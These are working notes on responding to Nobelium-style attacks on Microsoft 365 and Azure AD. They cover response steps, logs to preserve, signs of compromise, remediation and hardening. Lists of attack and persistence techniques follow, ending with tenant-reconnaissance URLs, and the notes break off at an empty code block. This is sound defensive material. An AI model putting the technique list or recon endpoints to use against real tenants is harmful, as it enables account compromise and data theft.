# Responding to sophisticated attacks on Microsoft 365 and Azure AD 

Rough working notes on responding to sophisticated attacks on Microsoft 365 and Azure AD (include those carried out by [Nobelium](https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/)). Notes are written between 2019 - 2021, so not all notes and references may still be correct. 

## Background on Nobelium 

Nobelium was one of the most prolific and technically-sophisticated threat actors observed in 2021. 

Nobelium distinguished itself from other threat actors, in its skill and adeptness at compromising organisations' Azure AD and Microsoft 365 environments. Nobelium was able to do this by combining both well known techniques (e.g. password spraying) and novel techniques into innovative attack paths that allow them to compromise accounts and gain long-term and stealthy access to data stored in cloud services. This is likely reflective of the significant investment it has made in researching offensive techniques against Microsoft cloud environments.

We will likely see these techniques trickling down to other threat actors over the next couple of years, after Nobelium has demonstrated how these attacks can be effectively carried out, and how these attacks evade traditional endpoint and network security monitoring. We are also likely to see other threat actors following its lead in primarily targeting cloud services, given the sensitive data organizations are storing  in cloud services, even as they  have yet to understand how best to secure it.

Nobelium has been observed targeting cloud resellers and MSPs, in order to compromise organisations’ Microsoft cloud environments, as well as directly targeting organisations, through phishing, use of compromise credentials and password spraying. 

* [Microsoft: Technical blog on SolarWinds attacks](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)
* [Microsoft: Updated list of Microsoft blogs](https://msrc-blog.microsoft.com/2020/12/21/december-21st-2020-solorigate-resource-center/)
* [Microsoft: NOBELIUM targeting delegated administrative privileges to facilitate broader attacks](https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/)
* [Microsoft: New activity from Russian actor Nobelium](https://blogs.microsoft.com/on-the-issues/2021/10/24/new-activity-from-russian-actor-nobelium/)
* [CISA: Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/M365 Compromise](https://www.cisa.gov/uscert/ncas/analysis-reports/ar21-134a)
* [CISA: Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments](https://us-cert.cisa.gov/ncas/alerts/aa21-008a)
* [Microsoft: Azure Sentinel Post-Compromise Hunting](https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095)
* [Microsoft: Advice for incident responders](https://www.microsoft.com/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compromises/)
* [Mandiant: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/wp-m-unc2452-2021-000343-01.pdf)
* [Mandiant: Suspected Russian Activity Targeting Government and Business Entities Around the Globe](https://www.mandiant.com/resources/russian-targeting-gov-business)

## Key steps to respond to attacks (work in progress notes)

1. [Mobilise the incident response team and secure their communications](#mobilise-the-incident-response-team-and-secure-their-communications)

3. [Understand how users are authenticated, and how Azure AD and Microsoft 365 are configured](#understand-how-users-are-authenticated-and-how-azure-ad-and-microsoft-365-are-configured)
4. [Identify and export available logs](#identify-and-export-available-logs)
5. [Investigate the extent of the attacker activity and the access the attacker has gained to the environment](#investigate-the-extent-of-the-attacker-activity-and-the-access-the-attacker-has-gained-to-the-environment)
6. [Regain administrative control and remove all attacker access](#regain-administrative-control-and-remove-all-attacker-access)
7. [Monitor for further attacker activity and prepare to rapidly respond](#monitor-for-further-attacker-activity-and-prepare-to-rapidly-respond)
8. [Improve security posture to defend against further attacks](#improve-security-posture-to-defend-against-further-attacks)

## Mobilise the incident response team and secure their communications

-   **Agree response priorities and objectives** to guide decision making during the course of the response.

-   **Secure the response team’s communications** to ensure that the attacker is not able to intercept communications.

-   **Establish response programme governance and workstreams** to ensure that response activities are effectively coordinated.

-   **Manage the response** by establishing a regular cadence of meetings, tracking progress against the objectives, and managing risks and issues.


## Understand how users are authenticated and how Azure AD and Microsoft 365 are configured

-   **Map out the authentication flows for how users can be authenticated**, including how what domains configured in Azure AD, [what authentication methods these domains use](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/plan-connect-user-signin), and if federated authentication is configured.

-   **Understand how Azure AD and Microsoft 365 are configured** including what accounts have privileged roles and what trust relationships exist with cloud service providers (see [Key configurations to review in Azure AD and Microsoft 365](#key-configurations-to-review-in-azure-ad-and-microsoft-365)).

-   **Understand what services and applications Azure AD provides authentication for**, for example SaaS applications like Salesforce, and how this could be abused by an attacker to gain unauthorised access to data.


## Identify and export available logs

-   **Review what logs are available from Azure AD, Microsoft 365, and Azure**, including identifying how long logs are being retained for and if logs are being forwarded to a SIEM (see [Key logs to identify and preserve in the initial stages of a response](#key-logs-to-identify-and-preserve-in-the-initial-stages-of-a-response)).

-   **Export available logs from Azure AD, Microsoft 365, and Azure for analysis and preservation** (its important to note that the different ways logs are exported impacts how they can be analysed), if they are not already being forwarded to a Log Analytics workspace or a SIEM.

-   **Review what logs are available for on-premises applications, endpoints and infrastructure**, including identifying how long logs are being retained for and if logs are being forwarded to a SIEM (see [Key logs to identify and preserve in the initial stages of a response](#key-logs-to-identify-and-preserve-in-the-initial-stages-of-a-response)).

-   **Export available logs from on-premises applications, endpoints and infrastructure for analysis and preservation**, if they are not already being forwarded to a SIEM.


## Investigate the extent of the attacker activity and the access the attacker has gained to the environment

-   **Identify identities and systems potentially compromised by the attacker**, by reviewing cloud logs for signs suspicious activity (see section [Key signs of suspicious activity](#key-signs-of-suspicious-activity) below) and any known indicators of compromise.

-   **Identify how initial access was gained** for example through phishing, compromise of on-premises environment, brute-forcing cloud accounts or through compromising a cloud service provider (see [Initial access techniques for gaining access to Microsoft 365 and Azure AD](#initial-access-techniques-for-gaining-access-to-microsoft-365-and-azure-ad) below).

-   **Investigate the extent of attacker’s activity** including how long the attacker had access to the environment and what they did with this access
-   **Identify any ‘persistence’ the attacker has gained** by reviewing Azure AD Sign-in logs for any signs of persistence methods being used and reviewing Azure AD Audit logs for signs of these being configured (see [Persistence techniques](#persistence-techniques) below).

-   **Validate that all persistence methods have been identified** by performing an in-depth audit of: Applications and service principals, custom domains and federation settings, conditional access policies, and Applications, consent grants and reply URIs.

-   **Identify whether the attacker used their access to compromise Azure services**, including by reviewing Azure Audit logs to identify use of the Azure Run command to execute commands on VMs and downloading of virtual machine images.

-   **Identify any illicit** [**application consent grants and delegated permissions**](https://docs.microsoft.com/en-us/security/compass/incident-response-playbook-app-consent), focusing on identify applications with delegated permissions that allow access to users emails or to perform sensitive operations.

-   **Identify any malicious changes to the configuration of Microsoft 365,** for example adding transport and forwarding rules, changes to mailbox folder permissions, adding impersonation permissions to accounts, and addition of delegates.

-   **Identify any malicious changes to Azure AD** for example adding permissions to accounts, Applications or Service Principals.

-   **Identify any malicious changes to permissions on Azure resources** for example adding new owners to subscriptions or resource groups.

-   **Deploy Endpoint Detection and Response tooling to on-premises and Azure servers** to allow the investigation team to hunt for and investigate attacker activity, and configure detection rules for known attacker indicators of compromise.

-   **Identify whether the attack used their access to compromise the on-premises environment** by sweeping for indicators of compromise with EDR, performing an audit of auto-runs for all systems, and reviewing Security logs from Tier 0 systems.

-   **Identify whether the attack used their access to compromise SaaS applications** by reviewing SaaS authentication logs.

-   **Assess the business impact of incident** by investigating what data was accessed by the attacker.

## Regain administrative control and remove all attacker access

### Prepare 

-   **Methodically plan how to remove all attacker access and persistence** identified during the investigation, and how to perform all remediation tasks whilst managing business impact.

-   **Block known indicators of compromise known to be used by the threat actor**, including by blocking IP addresses, sinkholing domains and blocking malware from executing.

-   **Temporarily break trust with on-premises Active Directory domains,** and switch to using cloud-mastered identity while remediating on-premise environment.


### Azure AD 

-   **Remove persistence methods and malicious configuration changes** and validate that this has been successfully performed.

-   **Remediate the initial access method used by the attacker**, for example by setting strong passwords and enabling MFA on compromised accounts.

-   **Remove accounts and service principals from privileged roles** unless strictly required (all privileged roles should be removed from accounts that are configured to sync with on-premises Active Directory domain).

-   **Limit privileged access to the tenant**, by configuring conditional access to limit the use of accounts with privileged roles, including enforcing multi-factor authentication using verification codes or hardware tokens, and restricting their use to [privileged access workstations](https://docs.microsoft.com/en-us/security/compass/privileged-access-devices).

-   **Create break glass global administrator accounts and ensure that these are excluded from all Conditional Access policies**

-   **Reset passwords of all privileged Azure AD accounts and revoke refresh tokens**

-   **Rotate credential material for any Service Principals that are members of privileged roles**

-   **Reset passwords for known compromised accounts and revoke refresh tokens**

-   **Block legacy authentication methods and review conditional access policies that are configured**

-   **Assess what authentication material the attacker may have been able to access** with the accounts they were able to compromise, and whether there was sufficient logging to confirm this (e.g. Access keys for Azure Storage accounts) and take steps to mitigate this risk.

-   **Assess what other authentication material the attacker would have been able to generate / steal** with the with the accounts they were able to compromise, and whether there was sufficient logging to confirm this (e.g. creating shared access signatures for Azure Storage accounts) and take steps to mitigate this risk.


### Active Directory 
-   **Remove domain administrator privileges from all on-premises user accounts and service accounts**, apart from those used by the remediation team and for break glass accounts.

-   **Identify, review and harden access to all on-premises Tier 0 systems**

-   **Remediate accounts in the on-premises environment**, including:  
    - Resetting all privileged accounts  
    - Resetting the AZUREADSSOACC account  
    - Resetting the on-premises AD DS connector account  
    - Resetting the Azure AD connector account  
    - Resetting the on-premises ADSync Service Account  
    - Resetting the local accounts on DCs  
    - Rotating the ADFS token-signing certificate twice  
    - Resetting the Kerberos ticket granting ticket account twice  
    - Rotating secrets associated with remote access MFA token generation

-   **Rebuild all compromised systems**

-   **Reset VMware ESXi root account passwords**

-   **Restart all systems** to mitigate the risk of in-memory malware still running, for example Cobalt Strike.

-   **Re-establish federation trusts between on-premises Active Directory domains and Azure AD tenant**

## Monitor for further attacker activity and prepare to rapidly respond

_This step can be performed before, or in parallel to the above step, depending on the response priorities and the risk appetite for tipping off the attacker to the investigation._

-   **Deploy cloud-based threat protection tooling, including** [Microsoft Defender for Identity](https://docs.microsoft.com/en-us/defender-for-identity/what-is) and Microsoft Defender for Cloud Apps.

-   **Onboard Azure AD, Microsoft 365 and Azure logs to Azure Sentinel**

-   **Configure and tune detection rules** for the configuration of persistence mechanism (e.g. addition of credentials to service principals and modifications to federation settings) and common attacker techniques (e.g. using Azure Run commands) (see Azure Sentinel Github rules [here](https://github.com/Azure/Azure-Sentinel/tree/8768b916756b827da02d1dfd95ece8fbe27049c4/Detections/AuditLogs), [here](https://github.com/Azure/Azure-Sentinel/tree/8768b916756b827da02d1dfd95ece8fbe27049c4/Detections/AzureActivity), and [here](https://github.com/Azure/Azure-Sentinel/tree/8768b916756b827da02d1dfd95ece8fbe27049c4/Detections/SigninLogs))

-   **Configure detection rules for known attacker indicators of compromise**

-   **Stand up 24/7 monitoring and response capability to monitor for security alerts, risk events and access to privileged accounts**

-   **Perform threat hunting based on the tools and techniques used in the incident** to ensure all further activity has been identified

-   **Configure** [**Microsoft 365 Advanced Auditing features**](https://docs.microsoft.com/en-us/microsoft-365/compliance/mailitemsaccessed-forensics-investigations) **and ensure logs are feeding through into Azure Sentinel**

-   **Restrict the use of on-premises domain administrator accounts** to prevent credentials for these accounts being unnecessarily exposed on systems increasing the risk of compromise. Restrict accounts in the domain admins group from [logging into workstations and servers](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-f--securing-domain-admins-groups-in-active-directory), to start to implementing a [three-tiered administration model](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access).

-   **Perform an enterprise-wide passwords reset**, including resetting all service accounts and configuring employee accounts to change password at next logon.

## Improve security posture to defend against further attacks

-   **Roll-out, configure and enforce multi-factor authentication for all user accounts** using conditional access policies.

-   **Ensure that multi-factor authentication is configured and enforced for other externally accessible applications**, for example remote access portals.

-   **Identify and remediate cyber security posture weaknesses that allowed the attacker to occur** by mapping techniques used by the attacker against the MITRE ATT&CK Framework and triaging targeted improvements.

-   **Implement sustainably secure cloud and on-premises administration practices** based on Microsoft’s [enterprise access model](https://docs.microsoft.com/en-us/security/compass/privileged-access-access-model).

-   **Implement** [**Azure AD**](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-deployment-checklist-p2) **and** [**Microsoft 365**](https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/security-roadmap?view=o365-worldwide) **good practice security guidance**

-   **Identify any Application or Service Principals using passwords as credentials and migrate these to using more secure forms of authentication whenever possible** (certificate, managed identities, or Windows Integrated Authentication or certificate).

-   **Remove sensitive permissions from applications, remove unnecessary grants**, and prevent users from being able to consent to unknown applications.

-   **Ensure conditional access policies limit access** to hybrid azure ad joined or compliant devices (Prevent the use of organisation accounts on unmanaged and personal devices).

-   **Ensure all logs in [Key logs to identify and preserve in the initial stages of a response](#key-logs-to-identify-and-preserve-in-the-initial-stages-of-a-response) are onboarded to the SIEM**

-   **Enhance detection and response capability by deploying and tuning further detection rules**, for promise and abuse privileged accounts, persistence techniques, and for rare global events (also centrally collect and retain logs).

-   **Ensure that Azure AD Identity Protection is configured with policies for high risk users and sign-in**s, along with Azure AD Self-Service Password Reset (SSPR) for all users.

-   **Review Microsoft Secure Secure, triage and implement remediation recommendations**

-   **Assign responsibility for regally auditing Azure AD and Microsoft 365 configuration**, including Applications and Service Principals, federation trust settings, Conditional Access policies, trust relationships and Microsoft Secure Score recommendations

-   **Enable Privileged Identity Manager in Azure AD** and set eligible assignment to Azure AD roles where these can be activated for a limited time when needed.

-   **Configure** [**Privileged Access Management**](https://techcommunity.microsoft.com/t5/microsoft-security-and/privileged-access-management-in-office-365-is-now-generally/ba-p/261751) **in Microsoft 365**

-   **Deploy Azure AD Password Protection** to detect and block known weak passwords**.**

-   **Limit application consent policy to administrators**

-   **Reduce the risk of phishing attacks,** including by deploying email tooling that restricts attachment file-types and scans for malicious content, and deploying always-on web security tooling that blocks malicious content and website categories.

-   **Harden workstations used by employees**, including by hardening endpoints to restrict the execution of untrusted scripts and executables (including with EPP tooling and Attack Surface Reduction rules), removing local administrator privileges from standard accounts and restricting the execution of untrusted Microsoft Office macros.

-   **Improve the security of the on-premises environment**, including by restricting internet access for all servers to an allow list, proactive hunting for Active Directory hygiene issues, and performing regular internal vulnerability scanning.

-   **Use security testing to validate improvements made**, including by using ‘red teaming’ to validate detection and response capabilities.


----------

## Key configurations to review in Azure AD and Microsoft 365

_Key configurations to review to understand how Azure AD and Microsoft 365 are configured, including how users authenticate, what trust relationships exist and what accounts have privileged roles:_

- Custom domains and federation settings with on-premises Active Directory domains (comparing settings, token URIs and certificates with those configured on the ADFS server)

- Trust relationships, including:

  -   Delegated admin privileges
  -   Administer On Behalf Of (AOBO) in Azure subscriptions

- Accounts that are members of highly privileged roles in Azure AD, and [roles often targeted by attackers](https://www.fireeye.com/content/dam/collateral/en/wp-m-unc2452.pdf):

  -   Global Administrator
  -   Application Administrator
  -   Cloud Application Administrator
  -   Exchange Administrator
  -   Privileged Role Administrator
  -   User Administrator
  -   SharePoint Administrator
  -   Hybrid Identity Administrator

- Accounts that are members of highly privileged roles and synced with on-premises Active Directory domains

- Accounts with multi-factor authentication configured / not configured

- Applications and service principals with sensitive permissions

- Applications and Service Principals with credentials configured (including Microsoft / built-in Service Principals)

- Conditional access policies and configuration (including trusted locations)

- Azure Identity Protection remediation rules

- Application Consent Grants

- Legacy authentication settings

- Azure AD Connect configuration

- ADFS Application Configuration

- There are various tools that can help with this including [Hawk](https://github.com/T0pCyber/hawk), [CRT](https://github.com/CrowdStrike/CRT), Azure IR and Mandiant IR. [https://github.com/AzureAD/AzureADAssessment/](https://github.com/AzureAD/AzureADAssessment/)

## Key logs to identify and preserve in the initial stages of a response

### Azure AD and Microsoft 365 logs

-   Microsoft Office 365 Unified Audit Logs (single exports limited to 50,000) (not configured by default) (if not already onboarded to Sentinel retained for 90 days E3 and 1 year for E5)

-   Azure AD logs (if not already onboarded to Azure Sentinel [retained for 30 days with Azure AD Premium P1/P2](https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-reports-data-retention)), note there are several types of logs:  
    - Audit log  
    - Sign-in logs  
    - NonInteractiveUserSignInLogs  
    - ServicePrincipalSignInLogs  
    - ManagedIdentitySignInLogs  
    - ProvisioningLogs  
    - ADFSSignInLogs  
    - RiskyUsers  
    - UserRiskEvents
-   Azure Activity logs ([retained for 90 days](https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log))

-   Microsoft Endpoint Manager Audit Logs

-   Azure Key Vault logging

-   Azure Identity Protection Risky sign-ins and detections


If **Azure AD logs are not already being ingested into a SIEM, there are a two options available for exporting them:**

-   Exporting via the Unified Audit Logs (UAL). Azure AD logs in the UAL are not stored in the same structured as those in Azure Sentinel. Logs from the UAL can be exported and then manually imported into Azure Data Explorer for analysis. Queries that can be used to search through the UAL logs in Azure Data Explorer are well documented [here](https://m365internals.com/2021/07/13/what-ive-learned-from-doing-a-year-of-cloud-forensics-in-azure-ad/).

-   Exporting via the Azure AD Console. Azure AD logs exported using this method are not stored in the same structured as those in Azure Sentinel.

-   Exporting via PowerShell. Azure AD logs can be exported via PowerShell using the AzureADPreview (_Get-AzureADAuditDirectoryLogs_ and _Get-AzureADAuditSignInLogs_). These can then be converted into JSON and imported into Azure Data Explorer for analysis. These logs will be in the same structure as the logs are present in Azure Sentinel. As a result well documented Sentinel KQL [detection queries](https://github.com/Azure/Azure-Sentinel/tree/master/Detections/AuditLogs) can be run against these.

**Logs from on-premises systems**

-   Security Event Logs from Tier 0 systems (including domain controllers, ADFS and AD connect servers)

-   Antivirus logs from management console

-   VPN logs

-   Exchange logs

-   vCenter logs

-   Security logs from multi-factor authentication management server

-   Privilege Access Management logs

### **Other logs**

-   Authentication logs from SaaS applications

## Key signs of suspicious activity

Key signs of suspicious activity to identify identities and systems potentially compromised by the attacker, as well as persistence methods in use / or configured by the attacker:

### Azure AD Sign-in logs

-   Potential brute forcing or password spraying of accounts

-   Repeated multi-factor authentication challenges denied by the user ([Attackers have been seen abusing multi-factor authentication by leveraging “push” notifications on smartphones](https://www.mandiant.com/resources/russian-targeting-gov-business))

-   Use of legacy protocols to login to accounts (Attackers bypass requirements for multi-factor authentication by authentication with legacy protocols)

-   Risk events and detections associated with account logins

-   Risk events and detections associated with account logins (can be used to help identify Golden SAML attacks)

-   Anomalous logins for privileged accounts

-   Anomalous logins for Service Principals

-   Impossible travel account logins

-   Users authenticating to Azure AD using PowerShell

-   Sign-ins from VPSs and cloud services

-   Suspicious logons from AD Connect accounts

-   Sign-ins from [residential IP proxy services or newly provisioned geo located infrastructure](https://www.mandiant.com/resources/russian-targeting-gov-business), to evade MFA and obfuscate logging (e.g. a geographically co-located azure instance)

-   Anomalous logins from on-premises infrastructure (used by attackers to bypass Conditional Access rules and requirements for multi-factor authentication)

### Azure AD Audit logs

-   [Privileged roles being added to user accounts or groups](https://github.com/Azure/Azure-Sentinel/blob/8768b916756b827da02d1dfd95ece8fbe27049c4/Detections/AuditLogs/UserAssignedPrivilegedRole.yaml) (Azure AD Audit logs)

-   Addition of credentials to Service Principals and Applications

-   [New or modified federation settings](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml)

-   Creation of service principals

-   Modification to Conditional Access policies, for example adding IPs to trusted locations

-   Creation of partner relationships


### Azure AD Configuration

-   Principals with credentials configured

### Microsoft 365

-   Service principals access mailboxes

-   eDiscovery searches (Unified Audit Logs — requires advance audit logging)

-   Mailbox activity, including reading email (Unified Audit Logs) MailItemsAccessed

-   Addition of transport rules and email forwarding rules (Unified Audit Logs)

### Microsoft 365 Configuration

-   adding transport and forwarding rules

-   changes to mailbox folder permissions

-   adding impersonation permissions to accounts

-   addition of delegates.

### Azure Activity Logs

-   Azure Run Command

-   Download of VM images from Azure

-   Azure storage bucket

-   Get SAS URLs

-   List Storage Account Keys

**On-premises logs**

-   Suspicious Access to tier 0 servers

-   Suspicious activity on Domain Controllers, ADFS or AD Connect servers

-   Privileged permissions being added to user accounts or groups

-   Stopping Sysmon and Splunk logging on devices and clearing Windows Event Logs (see ref [here](https://www.mandiant.com/resources/russian-targeting-gov-business))

### Attempt to access SaaS applications

-   Anomalous logins for accounts

## Persistence techniques

### Tenant

-   Addition of federation trusts or modification of existing trusts (T1484.002)

-   Compromise of organisations ADFS token-signing certificate to forge SAML tokens

-   Addition of partner relationships to the tenant

-   Addition of [sensitive permissions](https://github.com/microsoft/AzureADToolkit/blob/main/src/data/aadconsentgrantpermissiontable.csv) to Applications or Service Principals including AppRoleAssignment.ReadWrite.All, RoleManagement.ReadWrite.Directory, and Mail.Read

### Accounts and Service Principals

-   Addition of privileged roles to an Azure AD account (T1098.003)

-   Creating a Service Principals with credentials, or addition of credentials to Service Principals and Applications (T1098.001)

-   Compromise of organisations Service Principal credentials

-   Addition of [sensitive permissions](https://github.com/microsoft/AzureADToolkit/blob/main/src/data/aadconsentgrantpermissiontable.csv) to an Azure AD Service Principals or Applications (T1098.003)

-   Re-enroll a user for MFA

-   Reset account password

-   Creation and deletion of new accounts

-   Joining a fake device user accounts on Azure ADs

-   Modify conditional access to add in MFA trusted IPs

### Mailboxes

-   Modifications to Microsoft 365 mailbox delegate permissions (T1098.002)

-   Permissions being changed on mailboxes (Unified Audit Logs)

-   Addition of Application impersonation role to accounts

### Data

-   SAS

### Systems

-   Compromise VM with managed identity

## Initial access techniques for gaining access to Microsoft 365 and Azure AD

**Phishing and deploying malware to gain valid credentials**

-   Send phishing emails that deploy credential-stealing malware (username / passwords combinations, session tokens, primary refresh token)

-   Send phishing emails that use fake websites to compromise user’s username and passwords combinations (T1566.002)

-   Gain credentials (username and passwords combinations, or session tokens) from third-parties that deploy credential-stealing malware

-   Pass the Cert

**Phishing to gain access to accounts**

-   Send phishing emails that use the device-code phishing attack

-   Send phishing emails that use the consent grant attack to register malicious applications to access user data

**Brute forcing accounts to gain valid credentials**

-   Brute forcing credentials via legacy protocols (OWA / EWS)

-   Bruteforce via Azure AD Sign-in page

-   Bruteforce via Autologon API

**Compromising cloud-service providers (CSP) to gain access to tenants**

-   Compromise an account within a CSP’s tenant with Delegated Admin Privileges privileges to gain access to victim tenant (T1078.004)

-   Compromise an account within a CSP’s tenant with Admin on Behalf Of (AOBO) permissions to gain access to victim tenant (T1078.004)

**Compromising on-premises network to gain access to tenants**

-   Stealing or modify token-signing certificates to perform a Golden SAML attack

-   Compromise the AZUREADSSOACC account to forge Kerberos tickets (Silver ticket attack)

-   Compromise the Azure AD Connect accounts to set password for accounts in privileged cloud groups

-   Crack and dump clear text credentials to accounts in privileged cloud groups by compromising workstations, servers and domain controllers

-   Compromise stored service principal credentials from on-premise systems, and use these to authenticate to Azure AD

-   Backdoor the Pass-Through Authentication process to compromise cloud accounts

-   Compromise secrets from multi-factor authentication management server and use this to bypass MFA

**Compromising third-parties**

-   Compromise stored service principal credentials from on-premise systems, and use these to authenticate to Azure AD

-   Compromise secrets from multi-factor authentication management server and use this to bypass MFA

----------

## Azure AD Attack Techniques

  * [Background reading on Azure AD and authentication](#background-reading-on-azure-ad-and-authentication)
  * [Background reading on attack techniques](#background-reading-on-attack-techniques)
  * [Quick references](#quick-references)
  * [Reconnaissance against Azure AD tenants](#reconnaissance-against-azure-ad-tenants)
  * [Authenticated reconnaissance against Azure AD](#authenticated-reconnaissance-against-azure-ad)
  * [Using a compromised workstation to gain access to cloud identities and data](#using-a-compromised-workstation-to-gain-access-to-cloud-identities-and-data)
    + [Stealing the persistent authentication cookie from a compromised workstation](#stealing-the-persistent-authentication-cookie-from-a-compromised-workstation)
    + [Obtaining a refresh token from a compromised workstation](#obtaining-a-refresh-token-from-a-compromised-workstation)
    + [Stealing the primary refresh token from a compromised workstation](#stealing-the-primary-refresh-token-from-a-compromised-workstation)
    + [Dumping clear text credentials to authenticate to cloud services](#dumping-clear-text-credentials-to-authenticate-to-cloud-services)
  * [Using a compromised AD domain to gain access to cloud identities and data](#using-a-compromised-ad-domain-to-gain-access-to-cloud-identities-and-data)
    + [Stealing or modify token-signing certificates to perform a Golden SAML attack](#stealing-or-modify-token-signing-certificates-to-perform-a-golden-saml-attack)
    + [Compromising the AZUREADSSOACC account to forge Kerberos tickets](#compromising-the-azureadssoacc-account-to-forge-kerberos-tickets)
    + [Setting the password for an account in privileged cloud groups](#setting-the-password-for-an-account-in-privileged-cloud-groups)
    + [Dumping clear text credentials to accounts in privileged cloud groups](#dumping-clear-text-credentials-to-accounts-in-privileged-cloud-groups)
  * [Using a compromised cloud global admin account gain access to on-prem](#using-a-compromised-cloud-global-admin-account-gain-access-to-on-prem)
  * [Using a compromised third-party to gain access to cloud identities and data](#using-a-compromised-third-party-to-gain-access-to-cloud-identities-and-data)
  * [Using phishing attacks to gain access to cloud identities and data](#using-phishing-attacks-to-gain-access-to-cloud-identities-and-data)
    + [Consent grant phishing attack](#consent-grant-phishing-attack)
  * [Using password spraying to cloud accounts](#using-password-spraying-to-cloud-accounts)
  * [Gaining persistent access to cloud identities and data](#gaining-persistent-access-to-cloud-identities-and-data)
    + [Creating a new Service Principals to provide long-term API-based access](#creating-a-new-service-principals-to-provide-long-term-api-based-access)
    + [Adding credentials to an existing new Service Principals to provide long-term API-based access](#adding-credentials-to-an-existing-new-service-principals-to-provide-long-term-api-based-access)
    + [Configuring new or modifying existing federation trusts to perform Golden SAML attacks](#configuring-new-or-modifying-existing-federation-trusts-to-perform-golden-saml-attacks)
    + [Joining a fake device to Azure AD](#joining-a-fake-device-to-azure-ad)
    + [Dumping credentials for Azure resources](#dumping-credentials-for-azure-resources)
    + [Modify conditional access to add in MFA trusted IPs](#modify-conditional-access-to-add-in-mfa-trusted-ips)
  * [Pass the certificate](#pass-the-certificate)
  * [Hunting for backdoors](#hunting-for-backdoors)
    + [Commands to manually audit federation trusts](#commands-to-manually-audit-federation-trusts)
    + [Commands to manually audit service principals](#commands-to-manually-audit-service-principals)
      - [Review service principals with credentials](#review-service-principals-with-credentials)
    + [Review service principals with credentials and risky permissions](#review-service-principals-with-credentials-and-risky-permissions)
    + [Further hunting](#further-hunting)
  * [Notes on building a lab](#notes-on-building-a-lab)

## Background reading on Azure AD and authentication 

* [Microsoft ITOps | OPS108: Windows authentication internals in a hybrid world](https://techcommunity.microsoft.com/t5/itops-talk-blog/ops108-windows-authentication-internals-in-a-hybrid-world/ba-p/2109557)
* [Ignite | Deep-dive: Azure Active Directory Authentication and Single-Sign-On](https://channel9.msdn.com/Events/Ignite/Microsoft-Ignite-Orlando-2017/BRK3015)
* [OAuth 2.0 and OpenID Connect](https://www.youtube.com/watch?v=996OiexHze0&ab_channel=OktaDev)
* [Microsoft Identity Platform](https://docs.microsoft.com/en-us/azure/active-directory/develop/)
* [Microsoft Identity Platform | Service principles and applications](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)
* [Microsoft Identity Platform | OAuth2 Code flow](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)
* [Microsoft Identity Platform | What is a Primary Refresh Token?](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token)
* [Microsoft 365 internals explained | Microsoft Graph, substrate, and PowerShell with Jeffrey Snover](https://www.youtube.com/watch?v=uuiTR8r27Os&ab_channel=MicrosoftMechanics)
* [Microsoft | Azure AD Authentication basics (6 videos)](https://www.youtube.com/watch?v=fbSVgC8nGz4&list=PLLasX02E8BPBm1xNMRdvP6GtA6otQUqp0&index=13&ab_channel=MicrosoftAzure)
* [Overview of the Microsoft identity platform for developers](https://www.youtube.com/watch?v=zjezqZPPOfc)
* [Detailed look at Windows Credentials](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication?WT.mc_id=modinfra-12977-socuff)
* [Windows internals Version 7 Part 1 Chapter 7 Security](https://www.google.com/search?q=Windows+internals+Version+7+Part+1+Chapter+7&oq=Windows+internals+Version+7+Part+1+Chapter+7&aqs=chrome..69i57.211j0j4&sourceid=chrome&ie=UTF-8)

## Background reading on attack techniques
* [Attacking and Defending the Microsoft Cloud](https://adsecurity.org/wp-content/uploads/2019/08/2019-BlackHat-US-Metcalf-Morowczynski-AttackingAndDefendingTheMicrosoftCloud.pdf) [Video](https://www.youtube.com/watch?v=SG2ibjuzRJM&ab_channel=BlackHat)
* [DEF CON 25 | Gerald Steere, Sean Metcalf - Hacking the Cloud](https://www.youtube.com/watch?v=LufXEPTlPak&ab_channel=DEFCONConference)
* [TR19 | I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg&ab_channel=TROOPERScon)
* [PSCONFEU 2020 | Abusing Azure Active Directory: Who would you like to be today? - Nestori Syynimaa](https://www.youtube.com/watch?v=tJkjOnxcw6w&ab_channel=PowerShellConferenceEU)
* [Blachhat 2020 | My Cloud is APTs Cloud: Attacking and Defending O365](https://i.blackhat.com/USA-20/Thursday/us-20-Bienstock-My-Cloud-Is-APTs-Cloud-Investigating-And-Defending-Office-365.pdf)
* [BlueHat Seattle 2019 | I'm in your cloud: A year of hacking Azure AD](https://www.youtube.com/watch?v=fpUZJxFK72k&ab_channel=MicrosoftSecurityResponseCenter%28MSRC%29)
* [AD Attack and Defense](https://github.com/infosecn1nja/AD-Attack-Defense)

## Quick references 

* [Microsoft portals](https://msportals.io/)
* [Azure AD Red Team Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md)
* [Azure AD Red Team Cheat Sheet - Fork](https://github.com/rootsecdev/Azure-Red-Team)
* [Decoding JWTs](https://jwt.ms/)

## Reconnaissance against Azure AD tenants

```
https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
```

```
